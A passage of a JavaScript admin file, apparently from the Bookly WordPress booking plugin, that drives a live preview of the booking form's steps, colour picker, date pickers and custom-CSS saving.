jQuery(function ($) {
    let steps = {
            $service: $('#bookly-step-1'),
            $extras: $('#bookly-step-2'),
            $time: $('#bookly-step-3'),
            $repeat: $('#bookly-step-4'),
            $cart: $('#bookly-step-5'),
            $details: $('#bookly-step-6'),
            $payment: $('#bookly-step-7'),
            $done: $('#bookly-step-8')
        },
        $appearance = $('#bookly-appearance'),
        $color_picker = $('.bookly-js-color-picker'),
        $editableElements = $('.bookly-js-editable'),
        $show_progress_tracker = $('#bookly-show-progress-tracker'),
        $align_buttons_left = $('#bookly-align-buttons-left'),
        $step_settings = $('#bookly-step-settings'),
        $bookly_show_step_extras = $('#bookly-show-step-extras'),
        $bookly_show_step_repeat = $('#bookly-show-step-repeat'),
        $bookly_show_step_cart = $('#bookly-show-step-cart'),
        $bookly_tasks_show_time_step = $('#bookly-tasks-show-time-step'),
        // Service step.
        $staff_name_with_price = $('#bookly-staff-name-with-price'),
        $service_duration_with_price = $('#bookly-service-duration-with-price'),
        $service_name_with_duration = $('#bookly-service-name-with-duration'),
        $required_employee = $('#bookly-required-employee'),
        $required_location = $('#bookly-required-location'),
        $show_ratings = $('#bookly-show-ratings'),
        $show_chain_appointments = $('#bookly-show-chain-appointments'),
        $service_select = $('.bookly-js-select-service'),
        $staff_select = $('.bookly-js-select-employee'),
        $duration_select = $('.bookly-js-select-duration'),
        $location_select = $('.bookly-js-select-location'),
        $show_category_info = $('#bookly-show-category-info'),
        $category_info = $('#bookly-category-info'),
        $show_service_info = $('#bookly-show-service-info'),
        $service_info = $('#bookly-service-info'),
        $show_staff_info = $('#bookly-show-staff-info'),
        $staff_info = $('#bookly-staff-info'),
        // Time step.
        $time_step_nop = $('#bookly-show-nop-on-time-step'),
        $time_step_calendar = $('.bookly-js-selected-date'),
        $time_step_calendar_wrap = $('.bookly-js-slot-calendar'),
        $show_blocked_timeslots = $('#bookly-show-blocked-timeslots'),
        $show_waiting_list = $('#bookly-show-waiting-list'),
        $show_day_one_column = $('#bookly-show-day-one-column'),
        $show_single_slot = $('#bookly-show-single-slot'),
        $show_single_slot_per_day = $('#bookly-show-single-slot-per-day'),
        $single_slot_popover = $('#bookly-show-single-slot-popover'),
        $show_time_zone_switcher = $('#bookly-show-time-zone-switcher'),
        $show_calendar = $('#bookly-show-calendar'),
        $day_one_column = $('#bookly-day-one-column'),
        $day_multi_columns = $('#bookly-day-multi-columns'),
        $columnizer = $('.bookly-time-step .bookly-columnizer-wrap'),
        $highlight_special_hours = $('#bookly-highlight-special-hours'),
        // Step extras.
        $extras_step = $('.bookly-extra-step'),
        $extras_show = $('#bookly-step-settings [name="bookly_service_extras_show[]"]'),
        // Step repeat.
        $repeat_step_calendar = $('.bookly-js-repeat-until'),
        $repeat_variants = $('[class^="bookly-js-variant"]'),
        $repeat_variant = $('.bookly-js-repeat-variant'),
        $repeat_variant_monthly = $('.bookly-js-repeat-variant-monthly'),
        $repeat_weekly_week_day = $('.bookly-js-week-day'),
        $repeat_monthly_specific_day = $('.bookly-js-monthly-specific-day'),
        $repeat_monthly_week_day = $('.bookly-js-monthly-week-day'),
        $hide_times_input = $('#bookly-js-app-hide-times-input'),
        // Step Cart.
        $show_cart_extras = $('#bookly-show-cart-extras'),
        $book_more_place = $('#bookly-js-app-button-book-more-near-next'),
        $book_more_in_body = $('.bookly-js-app-button-book-more-near-next-related:eq(0)', steps.$cart),
        $book_more_in_footer = $('.bookly-js-app-button-book-more-near-next-related:eq(1)', steps.$cart),
        // Step details.
        $required_details = $('#bookly-cst-required-details'),
        $show_login_button = $('#bookly-show-login-button'),
        $show_facebook_login_button = $('#bookly-show-facebook-login-button'),
        $first_last_name = $('#bookly-cst-first-last-name'),
        $confirm_email = $('#bookly-cst-show-email-confirm'),
        $show_notes_field = $('#bookly-show-notes'),
        $show_birthday_fields = $('#bookly-show-birthday'),
        $show_address_fields = $('#bookly-show-address'),
        $show_google_maps = $('#bookly-show-google-maps'),
        $show_terms = $('#bookly-show-terms'),
        // Step payment.
        $show_coupons = $('#bookly-show-coupons'),
        $show_gift_cards = $('#bookly-show-gift-cards'),
        $show_tips = $('#bookly-show-tips'),
        // Step done.
        $done_nav_container = $('.bookly-nav-steps', steps.$done),
        $show_start_over = $('#bookly-show-start-over', $step_settings),
        $show_download_invoice = $('#bookly-show-download-invoice', $step_settings),
        $show_download_ics = $('#bookly-show-download-ics', $step_settings),
        $show_add_to_calendar = $('#bookly-show-add-to-calendar', $step_settings),
        $show_appointment_qr = $('#bookly-show-appointment-qr', $step_settings),
        $start_over = $('[data-option="bookly_l10n_step_done_button_start_over"]', $done_nav_container).parent('div'),
        $download_invoice = $('[data-option="bookly_l10n_button_download_invoice"]', $done_nav_container).parent('div'),
        $download_ics = $('[data-option="bookly_l10n_button_download_ics"]', $done_nav_container).parent('div'),
        $add_to_calendar = $('[data-option="bookly_l10n_info_add_to_calendar"]', steps.$done).parent('div'),
        $done_step_view = $('#bookly-done-step-view'),
        $qr_info_popover = $('#bookly-show-appointment-qr-popover'),
        // Buttons.
        $save_button = $('#ajax-send-appearance'),
        $reset_button = $('button[type=reset]'),
        $checkboxes = $appearance.find('input[type="checkbox"]'),
        $selects = $appearance.find('select[data-default]')
    ;

    $checkboxes.each(function () {
        $(this).data('default', $(this).prop('checked'));
    });
    // Menu fix for WP 3.8.1
    $('#toplevel_page_ab-system > ul').css('margin-left', '0px');

    // Apply color from color picker.
    var applyColor = function () {
        var color = $color_picker.wpColorPicker('color'),
            color_important = color + '!important;';
        $('.bookly-progress-tracker').find('.active').css('color', color).find('.step').css('background', color);
        $('.bookly-js-mobile-step-1 label').css('color', color);
        $('.bookly-label-error').css('color', color);
        $('.bookly-js-actions > a').css('background-color', color);
        $('.bookly-js-mobile-next-step').css('background', color);
        $('.bookly-js-week-days label').css('background-color', color);
        $('.picker__frame').attr('style', 'background: ' + color_important);
        $('.picker__header').attr('style', 'border-bottom: ' + '1px solid ' + color_important);
        $('.picker__day').off().mouseenter(function () {
            $(this).attr('style', 'color: ' + color_important);
        }).mouseleave(function () {
            $(this).attr('style', $(this).hasClass('picker__day--selected') ? 'color: ' + color_important : '')
        });
        $('.picker__day--selected').attr('style', 'color: ' + color_important);
        $('.picker__button--clear').attr('style', 'color: ' + color_important);
        $('.picker__button--today').attr('style', 'color: ' + color_important);
        $('.bookly-extra-step .bookly-extras-thumb.bookly-extras-selected').css('border-color', color);
        $('.bookly-columnizer .bookly-day, .bookly-schedule-date,.bookly-pagination li.active').css({
            'background': color,
            'border-color': color
        });
        $('.bookly-columnizer .bookly-hour').off().hover(
            function () { // mouse-on
                $(this).css({
                    'color': color,
                    'border': '2px solid ' + color
                });
                $(this).find('.bookly-hour-icon').css({
                    'border-color': color,
                    'color': color
                });
                $(this).find('.bookly-hour-icon > span').css({
                    'background': color
                });
            },
            function () { // mouse-out
                $(this).css({
                    'color': '#333333',
                    'border': '1px solid #cccccc'
                });
                $(this).find('.bookly-hour-icon').css({
                    'border-color': '#333333',
                    'color': '#cccccc'
                });
                $(this).find('.bookly-hour-icon > span').css({
                    'background': '#cccccc'
                });
            }
        );
        $('.bookly-details-step label').css('color', color);
        $('.bookly-card-form label').css('color', color);
        $('.bookly-nav-tabs .ladda-button, .bookly-nav-steps .ladda-button, .bookly-btn, .bookly-round, .bookly-square').css('background-color', color);
        $('.bookly-triangle').css('border-bottom-color', color);
        $('#bookly-pickadate-style').html('.picker__nav--next:before { border-left: 6px solid ' + color_important + ' } .picker__nav--prev:before { border-right: 6px solid ' + color_important + ' }');
    };

    // Init color picker.
    $color_picker.wpColorPicker({
        change: applyColor
    });

    // Init editable elements.
    $editableElements.booklyEditable();

    // Show progress tracker.
    $show_progress_tracker.on('change', function () {
        $('.bookly-progress-tracker').toggle(this.checked);
    }).trigger('change');

    // Align buttons to the left
    $align_buttons_left.on('change', function () {
        if (this.checked) {
            $('.bookly-nav-steps > div.bookly-right').removeClass('bookly-right ml-2').addClass('bookly-left mr-2');
        } else {
            $('.bookly-nav-steps > div.bookly-left').removeClass('bookly-left mr-2').addClass('bookly-right ml-2');
        }
    });

    $extras_show.on('change', function () {
        $('.bookly-js-extras-' + this.value, $extras_step).toggle(this.checked);
    }).trigger('change');

    // Show steps.
    $('[data-type="bookly-show-step-checkbox"]').on('change', function () {
        var target = $(this).data('target'),
            $button = $('.bookly-js-appearance-steps li a[href="#' + target + '"]'),
            $step = $('div[data-step="' + target + '"]');
        if ($(this).prop('checked')) {
            $button.parent().show();
            $step.show();
        } else {
            if ($button.hasClass('active')) {
                $('.bookly-js-appearance-steps li a[href="#bookly-step-1"]').trigger('click');
            }
            $button.parent().hide();
            $step.hide();
        }
        // Hide/show cart buttons
        if (target == 'bookly-step-5') {
            $('.bookly-js-go-to-cart').toggle($(this).prop('checked'));
        }

        $('.bookly-progress-tracker > div:visible').each(function (num) {
            $(this).find('.bookly-js-step-number').html(num + 1);
        });
        $('.bookly-js-appearance-steps > li:visible').each(function (num) {
            $(this).find('.bookly-js-step-number').html(num + 1);
        });
    }).trigger('change');

    // Show step specific settings.
    $('.bookly-js-appearance-steps li.nav-item').on('shown.bs.tab', function (e) {
        $step_settings.children().hide();
        switch ($(e.target).attr('href')) {
            case '#bookly-step-1':
                $step_settings.find('.bookly-js-service-settings').show();
                break;
            case '#bookly-step-2':
                $step_settings.find('.bookly-js-extras-settings').show();
                break;
            case '#bookly-step-3':
                $step_settings.find('.bookly-js-time-settings').show();
                break;
            case '#bookly-step-4':
                $step_settings.find('.bookly-js-repeat-settings').show();
                break;
            case '#bookly-step-5':
                $step_settings.find('.bookly-js-cart-settings').show();
                break;
            case '#bookly-step-6':
                $step_settings.find('.bookly-js-details-settings').show();
                break;
            case '#bookly-step-7':
                $step_settings.find('.bookly-js-payment-settings').show();
                break;
            case '#bookly-step-8':
                $step_settings.find('.bookly-js-done-settings').show();
                break;
        }
    });

    // Dismiss help notice.
    $('#bookly-js-hint-alert').on('closed.bs.alert', function () {
        $.ajax({
            url: ajaxurl,
            data: {action: 'bookly_dismiss_appearance_notice', csrf_token: BooklyL10nGlobal.csrf_token}
        });
    });

    /**
     * Step Service
     */

    // Init calendar.
    $('.bookly-js-date-from').pickadate({
        formatSubmit: 'yyyy-mm-dd',
        format: BooklyL10n.date_format,
        min: true,
        clear: false,
        close: false,
        today: BooklyL10n.today,
        weekdaysFull: BooklyL10n.daysFull,
        weekdaysShort: BooklyL10n.days,
        monthsFull: BooklyL10n.months,
        labelMonthNext: BooklyL10n.nextMonth,
        labelMonthPrev: BooklyL10n.prevMonth,
        onRender: applyColor,
        firstDay: BooklyL10n.startOfWeek == 1
    });

    // Show price next to staff member name.
    $staff_name_with_price.on('change', function () {
        var staff = $staff_select.val();
        if (staff) {
            $('.bookly-js-select-employee').val(staff * -1);
        }
        $('.employee-name-price').toggle($staff_name_with_price.prop("checked"));
        $('.employee-name').toggle(!$staff_name_with_price.prop("checked"));
    }).trigger('change');

    if ($service_duration_with_price.prop('checked')) {
        $duration_select.val(-1);
    }

    // Category info.
    $show_category_info.on('change', function () {
        $category_info.toggle($(this).prop('checked'));
    }).trigger('change');

    // Service info.
    $show_service_info.on('change', function () {
        $service_info.toggle($(this).prop('checked'));
    }).trigger('change');

    // Staff info.
    $show_staff_info.on('change', function () {
        $staff_info.toggle($(this).prop('checked'));
    }).trigger('change');

    // Show price next to service duration.
    $service_duration_with_price.on('change', function () {
        var duration = $duration_select.val();
        if (duration) {
            $duration_select.val(duration * -1);
        }
        $('.bookly-js-duration-price').toggle($service_duration_with_price.prop('checked'));
        $('.bookly-js-duration').toggle(!$service_duration_with_price.prop('checked'));
    }).trigger('change');

    $show_ratings.on('change', function () {
        var state = $(this).prop('checked');
        $('.bookly-js-select-employee option').each(function () {
            if ($(this).val() != '0') {
                if (!state) {
                    if ($(this).text().charAt(0) == '★') {
                        $(this).text($(this).text().substring(5));
                    }
                } else {
                    var rating = Math.round(10 * (Math.random() * 6 + 1)) / 10;
                    if (rating <= 5) {
                        $(this).text('★' + rating.toFixed(1) + ' ' + $(this).text());
                    }
                }
            }
        });
    }).trigger('change');

    // Show chain appointments
    $show_chain_appointments.on('change', function () {
        $('.bookly-js-chain-appointments').toggle(this.checked);
    });

    // Show duration next to service name.
    $service_name_with_duration.on('change', function () {
        var service = $service_select.val();
        if (service) {
            $service_select.val(service * -1);
        }
        $('.service-name-duration').toggle($service_name_with_duration.prop("checked"));
        $('.service-name').toggle(!$service_name_with_duration.prop("checked"));
    }).trigger('change');

    // Show price next to service duration.
    $service_duration_with_price.on('change', function () {
        if ($(this).prop('checked')) {
            $('option[value="1"]', $duration_select).each(function () {
                $(this).text($(this).attr('data-text-1'));
            });
        } else {
            $('option[value="1"]', $duration_select).each(function () {
                $(this).text($(this).attr('data-text-0'));
            });
        }
    }).trigger('change');

    // Clickable week-days.
    $repeat_weekly_week_day.on('change', function () {
        $(this).parent().toggleClass('active', this.checked);
    });

    // Highlight affected inputs.
    $required_employee.on('click', function () {
        bookly_highlight($staff_select);
    });
    $staff_name_with_price.on('click', function () {
        bookly_highlight($staff_select);
    });
    $show_ratings.on('click', function () {
        bookly_highlight($staff_select);
    });
    $service_name_with_duration.on('click', function () {
        bookly_highlight($service_select);
    });
    $service_duration_with_price.on('click', function () {
        bookly_highlight($duration_select);
    });
    $required_location.on('click', function () {
        bookly_highlight($location_select);
    });
    $required_details.on('change', function () {
        if (this.value == 'phone' || this.value == 'both') {
            bookly_highlight($('.bookly-js-details-phone input'));
        }
        if (this.value == 'email' || this.value == 'both') {
            bookly_highlight($('.bookly-js-details-email input'));
        }
    });

    /**
     * Step Time
     */

    // Init calendar.
    $time_step_calendar.pickadate({
        formatSubmit: 'yyyy-mm-dd',
        format: BooklyL10n.date_format,
        min: true,
        weekdaysFull: BooklyL10n.daysFull,
        weekdaysShort: BooklyL10n.days,
        monthsFull: BooklyL10n.months,
        labelMonthNext: BooklyL10n.nextMonth,
        labelMonthPrev: BooklyL10n.prevMonth,
        close: false,
        clear: false,
        today: false,
        closeOnSelect: false,
        onRender: applyColor,
        firstDay: BooklyL10n.startOfWeek == 1,
        klass: {
            picker: 'picker picker--opened picker--focused'
        },
        onClose: function () {
            this.open(false);
        }
    });
    $time_step_calendar_wrap.find('.picker__holder').css({top: '0px', left: '0px'});

    // Show calendar.
    $show_calendar.on('change', function () {
        if (this.checked) {
            $time_step_calendar_wrap.show();
            $day_multi_columns.find('.col3,.col4,.col5,.col6,.col7').hide();
            $day_multi_columns.find('.col2 button:gt(0)').removeClass('d-block').addClass('d-none');
            $day_one_column.find('.col2,.col3,.col4,.col5,.col6,.col7').hide();
        } else {
            $time_step_calendar_wrap.hide();
            $day_multi_columns.find('.col2 button:gt(0)').removeClass('d-none').addClass('d-block');
            $day_multi_columns.find('.col2 button.bookly-js-first-child').attr('style', 'background: ' + $color_picker.wpColorPicker('color') + '!important').removeClass('d-none').addClass('d-block');
            $day_multi_columns.find('.col3,.col4,.col5,.col6,.col7').css('display', 'inline-block');
            $day_one_column.find('.col2,.col3,.col4,.col5,.col6,.col7').css('display', 'inline-block');
        }
        $show_single_slot.trigger('change');
    }).trigger('change');

    // Show blocked time slots.
    $show_blocked_timeslots.on('change', function () {
        if (this.checked) {
            $('.bookly-hour.no-booked').removeClass('no-booked').addClass('booked');
            $('.bookly-column .bookly-hour.booked .bookly-time-additional', $columnizer).text('');
        } else {
            $('.bookly-hour.booked').removeClass('booked').addClass('no-booked');
            if ($time_step_nop.prop('checked')) {
                $('.bookly-column .bookly-hour:not(.booked):not(.bookly-slot-in-waiting-list) .bookly-time-additional', $columnizer).each(function () {
                    var nop = Math.ceil(Math.random() * 9);
                    if (BooklyL10n.nop_format == 'busy') {
                        $(this).text('[' + nop + '/10]');
                    } else {
                        $(this).text('[' + nop + ']');
                    }
                });
            }
        }
        $show_single_slot.trigger('change');
    });

    // Show day as one column.
    $show_day_one_column.change(function () {
        if (this.checked) {
            $day_one_column.show();
            $day_multi_columns.hide();
        } else {
            $day_one_column.hide();
            $day_multi_columns.show();
        }
    });

    // Show only nearest slot.
    $show_single_slot.change(function () {
        if (this.checked) {
            $show_single_slot_per_day.prop('disabled', true);
            $day_multi_columns.find('.bookly-day').each(function (index) {
                if (index !== 0) {
                    $(this).removeClass('d-block').addClass('d-none');
                }
            });
            $day_one_column.find('.bookly-day').each(function (index) {
                if (index !== 0) {
                    $(this).removeClass('d-block').addClass('d-none');
                }
            });
            $day_multi_columns.find('.bookly-hour').each(function (index) {
                if (index !== 0) {
                    $(this).removeClass('d-block').addClass('d-none');
                } else {
                    $(this).removeClass('bookly-slot-in-waiting-list booked no-waiting-list').find('.bookly-time-additional').remove();
                }
                if ($show_blocked_timeslots.prop('checked')) {
                    $('#bookly-day-multi-columns .bookly-column.col1 .bookly-hour:not(:first)').removeClass('d-none').addClass('d-block booked');
                    $('#bookly-day-one-column .bookly-column.col1 .bookly-hour:not(:first)').removeClass('d-none').addClass('d-block booked');
                }
            });
            $day_one_column.find('.bookly-hour').each(function (index) {
                if (index !== 0) {
                    $(this).removeClass('d-block').addClass('d-none');
                } else {
                    $(this).removeClass('bookly-slot-in-waiting-list booked no-waiting-list').find('.bookly-time-additional').remove();
                }
                if ($show_blocked_timeslots.prop('checked')) {
                    $('#bookly-day-multi-columns .bookly-column.col1 .bookly-hour:not(:first)').removeClass('d-none').addClass('d-block booked');
                    $('#bookly-day-one-column .bookly-column.col1 .bookly-hour:not(:first)').removeClass('d-none').addClass('d-block booked');
                }
            });
            $('.bookly-column .bookly-hour.bookly-slot-in-waiting-list').removeClass('bookly-slot-in-waiting-list').addClass('no-waiting-list').find('.bookly-time-additional').text('');
            $time_step_nop.trigger('change');
            $single_slot_popover.booklyPopover('show');
            setTimeout(function () {
                $single_slot_popover.booklyPopover('hide');
            }, 4500);
        } else {
            $show_single_slot_per_day.prop('disabled', false);
            $day_multi_columns.find('.bookly-day').removeClass('d-none').addClass('d-block');
            $day_one_column.find('.bookly-day').removeClass('d-none').addClass('d-block');
            $day_multi_columns.find('.bookly-hour').each(function () {
                if ($(this).hasClass('no-waiting-list')) {
                    $(this).removeClass('booked');
                }
                $(this).removeClass('d-none').addClass('d-block');
            });
            $day_one_column.find('.bookly-hour').each(function () {
                if ($(this).hasClass('no-waiting-list')) {
                    $(this).removeClass('booked');
                }
                $(this).removeClass('d-none').addClass('d-block');
            });
            if ($show_calendar.prop('checked')) {
                $day_multi_columns.find('.col2 button:gt(0)').removeClass('d-block').addClass('d-none');
                $day_one_column.find('.col2 button:gt(0)').removeClass('d-block').addClass('d-none');
            }
            $show_waiting_list.trigger('change');
            $('#bookly-show-single-slot-popover').booklyPopover('hide');
        }
        $('.bookly-js-mobile-step-2').toggle(!this.checked);
    }).trigger('change');

    // Show only nearest slot.
    $show_single_slot_per_day.change(function () {
        if (this.checked) {
            $show_single_slot.prop('disabled', true);
            $('.bookly-columnizer .bookly-hour').removeClass('d-block').addClass('d-none');
            $('.bookly-columnizer .bookly-day + .bookly-hour').removeClass('d-none').addClass('d-block');
        } else {
            $show_single_slot.prop('disabled', false);
            $('.bookly-columnizer .bookly-hour').removeClass('d-none').addClass('d-block');
        }
    }).trigger('change');

    // Show time zone switcher
    $show_time_zone_switcher.on('change', function () {
        $('.bookly-js-time-zone-switcher').toggle(this.checked);
    }).trigger('change');

    // Show nop/capacity
    $time_step_nop.on('change', function () {
        if (this.checked) {
            $('.bookly-column', $columnizer).addClass('bookly-column-wide');
            $('.bookly-column .bookly-hour:not(.booked):not(.bookly-slot-in-waiting-list) .bookly-time-additional', $columnizer).each(function () {
                var nop = Math.ceil(Math.random() * 9);
                if (BooklyL10n.nop_format == 'busy') {
                    $(this).text('[' + nop + '/10]');
                } else {
                    $(this).text('[' + nop + ']');
                }
            });
            $('.bookly-column.col5', $columnizer).hide();
            $('.bookly-column.col6', $columnizer).hide();
            $('.bookly-column.col7', $columnizer).hide();
        } else {
            $('.bookly-column', $columnizer).removeClass('bookly-column-wide');
            $('.bookly-column .bookly-hour:not(.bookly-slot-in-waiting-list) .bookly-time-additional', $columnizer).text('');
            if (!$show_calendar.prop('checked')) {
                $('.bookly-column', $columnizer).removeClass('bookly-column-wide').show();
            }
        }
    }).trigger('change');

    $show_waiting_list.on('change', function () {
        if (this.checked) {
            $('.bookly-column .bookly-hour.no-waiting-list, .bookly-column .bookly-hour.bookly-slot-in-waiting-list').each(function () {
                $(this).removeClass('no-waiting-list').addClass('bookly-slot-in-waiting-list').find('.bookly-time-additional').text('(' + Math.floor(Math.random() * 10) + ')');
            })
        } else {
            $('.bookly-column .bookly-hour.bookly-slot-in-waiting-list').removeClass('bookly-slot-in-waiting-list').addClass('no-waiting-list').find('.bookly-time-additional').text('');
            $time_step_nop.trigger('change');
        }
    }).trigger('change');

    $highlight_special_hours.on('change', function () {
        if (this.checked) {
            $('.bookly-column .bookly-hour span:first-child').each(function () {
                if (Math.random() < 0.2) {
                    $(this).addClass('font-weight-bold');
                }
            })
        } else {
            $('.bookly-column .bookly-hour span:first-child').removeClass('font-weight-bold');
        }
    }).trigger('change');

    /**
     * Step repeat.
     */

    // Init calendar.
    $repeat_step_calendar.pickadate({
        formatSubmit: 'yyyy-mm-dd',
        format: BooklyL10n.date_format,
        min: true,
        clear: false,
        close: false,
        today: BooklyL10n.today,
        weekdaysFull: BooklyL10n.daysFull,
        weekdaysShort: BooklyL10n.days,
        monthsFull: BooklyL10n.months,
        labelMonthNext: BooklyL10n.nextMonth,
        labelMonthPrev: BooklyL10n.prevMonth,
        onRender: applyColor,
        firstDay: BooklyL10n.startOfWeek == 1
    });
    $repeat_variant.on('change', function () {
        $repeat_variants.hide();
        $('.bookly-js-variant-' + this.value).show()
    }).trigger('change');

    $repeat_variant_monthly.on('change', function () {
        $repeat_monthly_week_day.toggle(this.value != 'specific');
        $repeat_monthly_specific_day.toggle(this.value == 'specific');
    }).trigger('change');

    $repeat_weekly_week_day.on('change', function () {
        var $this = $(this);
        if ($this.is(':checked')) {
            $this.parent().not("[class*='active']").addClass('active');
        } else {
            $this.parent().removeClass('active');
        }
    });

    $bookly_show_step_repeat.change(function () {
        $('.bookly-js-repeat-enabled').toggle(this.checked);
    }).trigger('change');

    $hide_times_input.change(function () {
        $('.bookly-js-until').toggle(!this.checked);
    }).trigger('change');

    /**
     * Step Cart
     */

    $show_cart_extras.change(function () {
        $('.bookly-js-extras-cart').toggle(this.checked);
    }).trigger('change');

    $book_more_place.change(function () {
        $book_more_in_body.toggle(!this.checked);
        $book_more_in_footer.toggle(this.checked);
    }).trigger('change');

    /**
     * Step Details
     */

    // Init phone field.
    if (BooklyL10n.intlTelInput.enabled) {
        $('.bookly-user-phone').intlTelInput({
            preferredCountries: [BooklyL10n.intlTelInput.country],
            initialCountry: BooklyL10n.intlTelInput.country,
            geoIpLookup: function (callback) {
                $.get('https://ipinfo.io', function () {}, 'jsonp').always(function (resp) {
                    var countryCode = (resp && resp.country) ? resp.country : '';
                    callback(countryCode);
                });
            },
            utilsScript: BooklyL10n.intlTelInput.utils
        });
    }

    // Show login button.
    $show_login_button.change(function () {
        $('#bookly-login-button').toggle(this.checked);
    }).trigger('change');

    // Show Facebook login button.
    $show_facebook_login_button.change(function () {
        if ($(this).data('appid') == undefined || $(this).data('appid') == '') {
            if (this.checked) {
                $('#bookly-facebook-warning').booklyModal('show');
                this.checked = false;
            }
        } else {
            $('#bookly-facebook-login-button').toggle(this.checked);
        }
    });

    // Show first and last name.
    $first_last_name.on('change', function () {
        $first_last_name.closest('[data-toggle="bookly-popover"]').booklyPopover('toggle');
        if (this.checked) {
            $('.bookly-js-details-full-name').addClass('bookly-collapse');
            $('.bookly-js-details-first-last-name').removeClass('bookly-collapse');
            if ($confirm_email.is(':checked')) {
                $('.bookly-js-details-email').removeClass('bookly-collapse');
                $('.bookly-js-details-confirm').removeClass('bookly-collapse');
                $('.bookly-js-details-email-confirm').addClass('bookly-collapse');
            } else {
                $('.bookly-js-details-email').removeClass('bookly-collapse');
                $('.bookly-js-details-confirm').addClass('bookly-collapse');
                $('.bookly-js-details-email-confirm').addClass('bookly-collapse');
            }
        } else {
            $('.bookly-js-details-full-name').removeClass('bookly-collapse');
            $('.bookly-js-details-first-last-name').addClass('bookly-collapse');
            if ($confirm_email.is(':checked')) {
                $('.bookly-js-details-email').addClass('bookly-collapse');
                $('.bookly-js-details-confirm').addClass('bookly-collapse');
                $('.bookly-js-details-email-confirm').removeClass('bookly-collapse');
            } else {
                $('.bookly-js-details-email').removeClass('bookly-collapse');
                $('.bookly-js-details-confirm').addClass('bookly-collapse');
                $('.bookly-js-details-email-confirm').addClass('bookly-collapse');
            }
        }
    });

    // Show first and last name.
    $confirm_email.on('change', function () {
        if (this.checked) {
            if ($first_last_name.is(':checked')) {
                $('.bookly-js-details-email').removeClass('bookly-collapse');
                $('.bookly-js-details-confirm').removeClass('bookly-collapse');
                $('.bookly-js-details-email-confirm').addClass('bookly-collapse');
            } else {
                $('.bookly-js-details-email').addClass('bookly-collapse');
                $('.bookly-js-details-confirm').addClass('bookly-collapse');
                $('.bookly-js-details-email-confirm').removeClass('bookly-collapse');
            }
        } else {
            if ($first_last_name.is(':checked')) {
                $('.bookly-js-details-email').removeClass('bookly-collapse');
                $('.bookly-js-details-confirm').addClass('bookly-collapse');
                $('.bookly-js-details-email-confirm').addClass('bookly-collapse');
            } else {
                $('.bookly-js-details-email').removeClass('bookly-collapse');
                $('.bookly-js-details-confirm').addClass('bookly-collapse');
                $('.bookly-js-details-email-confirm').addClass('bookly-collapse');
            }
        }
    });

    // Show notes field.
    $show_notes_field.change(function () {
        $('#bookly-js-notes').toggle(this.checked);
    }).trigger('change');

    // Show birthday fields
    $show_birthday_fields.change(function () {
        $('#bookly-js-birthday').toggle(this.checked);
    }).trigger('change');

    // Show address fields
    $show_address_fields.change(function () {
        $('#bookly-js-address').toggle(this.checked);
        if (this.checked) {
            $show_google_maps.closest('[data-toggle="bookly-popover"]').booklyPopover('disable');
            $show_google_maps.prop('disabled', false);
        } else {
            $show_google_maps.closest('[data-toggle="bookly-popover"]').booklyPopover('enable');
            $show_google_maps.prop('checked', false).prop('disabled', true).trigger('change');
        }
    }).trigger('change');

    // Show address fields
    $show_google_maps.change(function () {
        $('.bookly-js-google-maps').toggle(this.checked);
    }).trigger('change');

    $show_terms.change(function () {
        $('.bookly-js-terms').toggle(this.checked);
    }).trigger('change');

    /**
     * Step Payment.
     */

    // Switch payment step view (single/several services).
    $('#bookly-payment-step-view').on('change', function () {
        $('.bookly-js-payment-single-app', steps.$payment).toggle(this.value == 'single-app');
        $('.bookly-js-payment-several-apps', steps.$payment).toggle(this.value == 'several-apps');
        $('.bookly-js-payment-100percents-off-price', steps.$payment).toggle(this.value == '100percents-off-price');
        $('.bookly-js-payment-gateways', steps.$payment).toggle(this.value !== '100percents-off-price');
        $('.bookly-js-payment-gateways-intersected', steps.$payment).toggle(this.value != 'without-intersected-gateways');
        $('.bookly-js-payment-impossible', steps.$payment).toggle(this.value == 'without-intersected-gateways');
        $()
    }).trigger('change');

    // Show credit card form.
    $('.bookly-payment-nav :radio').on('change', function () {
        $('form.bookly-card-form').hide();
        if (this.id == 'bookly-card-payment') {
            $('form.bookly-card-form', $(this).closest('.bookly-box')).show();
        }
    });

    $show_coupons.on('change', function () {
        $('.bookly-js-payment-coupons').toggle(this.checked);
    });

    $show_gift_cards.on('change', function () {
        $('.bookly-js-payment-gift-cards').toggle(this.checked);
    }).trigger('change');

    $show_tips.on('change', function () {
        $('.bookly-js-payment-tips').toggle(this.checked);
    }).trigger('change');

    /**
     * Step Done.
     */

    // Switch done step view (success/error).
    $done_step_view.on('change', function () {
        $('[class*="bookly-js-done-state-"]').hide();
        $('.bookly-js-done-state-' + this.value).show();
        doneNavContainerToggle();
    });

    $show_appointment_qr.on('change', function () {
        $('.bookly-js-qr').toggle(this.checked);
        if (this.checked) {
            $qr_info_popover.booklyPopover('show');
            setTimeout(function () {
                $qr_info_popover.booklyPopover('hide');
            }, 2500);
        } else {
            $qr_info_popover.booklyPopover('hide');
        }
    }).trigger('change');

    $show_start_over.change(function () {
        doneNavContainerToggle();
    }).trigger('change');

    $show_download_invoice.change(function () {
        doneNavContainerToggle();
    });

    $show_download_ics.change(function () {
        doneNavContainerToggle();
    });

    $show_add_to_calendar.change(function () {
        doneNavContainerToggle();
    });

    function doneNavContainerToggle() {
        let show_container = $show_start_over.prop('checked') || $show_download_ics.prop('checked');
        switch ($done_step_view.val()) {
            case 'booking-success':
            case 'booking-processing':
                show_container = show_container || ($show_download_invoice.length > 0 && $show_download_invoice.prop('checked'));
                $download_invoice.toggle($show_download_invoice.prop('checked'));
                $download_ics.toggle($show_download_ics.prop('checked'));
                $add_to_calendar.toggle($show_add_to_calendar.prop('checked'));
                break;
            case 'booking-limit-error':
                $download_ics.hide();
                $download_invoice.hide();
                break;
            case 'booking-skip-payment':
                $download_ics.toggle($show_download_ics.prop('checked'));
                $download_invoice.hide();
                break;
        }

        $done_nav_container.toggle(show_container);
        $start_over.toggle($show_start_over.prop('checked'));
    }

    /**
     * Misc.
     */
    $('.bookly-js-simple-popover').booklyPopover({
        container: $appearance,
    });

    // Custom CSS.
    $('#bookly-custom-css-save').on('click', function (e) {
        let $custom_css = $('#bookly-custom-css'),
            $modal = $('#bookly-custom-css-dialog');

        saved_css = $custom_css.val();

        var ladda = Ladda.create(this);
        ladda.start();

        $.ajax({
            url: ajaxurl,
            type: 'POST',
            data: {
                action: 'bookly_save_custom_css',
                csrf_token: BooklyL10nGlobal.csrf_token,
                custom_css: $custom_css.val()
            },
            dataType: 'json',
            success: function (response) {
                if (response.success) {
                    $modal.booklyModal('hide');
                    booklyAlert({success: [response.data.message]});
                }
            },
            complete: function () {
